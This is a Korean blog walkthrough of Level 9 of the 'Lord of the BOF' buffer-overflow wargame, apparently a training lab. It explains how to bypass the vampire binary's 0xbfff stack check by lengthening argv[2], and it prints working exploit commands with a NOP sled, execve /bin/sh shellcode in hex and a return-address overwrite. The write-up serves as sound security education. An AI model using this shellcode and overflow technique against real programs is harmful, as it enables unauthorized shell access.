---
layout: post
title: "The Lord of the BOF - Level 9"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level9/1.jpg" | relative_url }}' alt='relative'>  

## 1) troll/aspirin 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level9/2.png" | relative_url }}' alt='relative'>  

``` c
// here is changed!
// check 0xbfff
if(argv[1][46] == '\xff')
{
        printf("but it's not forever\n");
        exit(0);
}
```

RET 주소에 0xbfffXXXX 주소를 입력할 수 없습니다.  
그러면 쉘코드를 0xbffeXXXX 주소에 입력하면 되지 않을까요?  

## 2) vampire 프로그램의 스택 구조 살펴보기  

<img data-action="zoom" src='{{ "assets/lob/level9/3.png" | relative_url }}' alt='relative'>  

``` bash
`python -c 'print "A"*47+"\xbf"'` `python -c 'print "\x90"*1000'`
```

위와 같이 argv[1]의 길이는 48 byte, argv[2]의 길이는 1000 byte로 줬을 때 0xbffff8cc 주소에 argv[2]가 위치하고 있습니다.  
그러면 argv[2]에 문자열을 아주 길게 입력하여 0xbffeXXXX 주소부터 시작하도록 만들어 보겠습니다.  

0xbffeXXXX 주소에 argv[2]의 문자열이 위치하도록 0xf8cd 길이 이상의 문자열을 입력해야 합니다.  

## 3) 공격 페이로드 만들기  

25 byte 쉘코드를 포함한 0x14806(83,974) byte의 문자열을 만들었습니다.  

``` bash
`python -c 'print "A"*47+"\xbf"'` `python -c 'print "\x90"*10000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*63924'`
```

<img data-action="zoom" src='{{ "assets/lob/level9/4.png" | relative_url }}' alt='relative'>  

argv[2]가 위치하는 주소가 0xbffedbe8 입니다. RET에 입력할 주소를 임의로 0xbffefe2c로 지정하겠습니다.  

``` bash
./vampire `python -c 'print "A"*44+"\x2c\xfe\xfe\xbf"'` `python -c 'print "\x90"*10000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*63924'`
```

<img data-action="zoom" src='{{ "assets/lob/level9/5.png" | relative_url }}' alt='relative'>  